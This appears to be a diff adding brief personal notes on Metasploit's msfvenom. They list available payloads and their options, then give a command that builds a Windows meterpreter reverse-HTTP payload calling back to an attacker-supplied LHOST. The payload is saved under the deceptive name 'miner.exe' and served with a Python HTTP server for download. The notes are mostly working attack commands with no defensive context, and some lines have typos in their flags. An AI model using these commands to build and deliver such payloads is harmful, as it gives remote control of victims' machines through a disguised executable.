@@ -1,0 +1,11 @@
+Msfvenom - list payloads = will show payloads are available within msvenom (does take time)
+Msfvenom --list payloads –platform windows 
+Msfvenom –list payloads –platform python | grep meterpreter
+Msfvenom -p python/meterpreter_reverse_tcp –list-options
+
+
+
+Msfvenom -p windows/meterpreter_reverse_http LHOST-[IPADDRESS] -f exe > miner.exe
+python3 -m http.server 
+to listen 
+
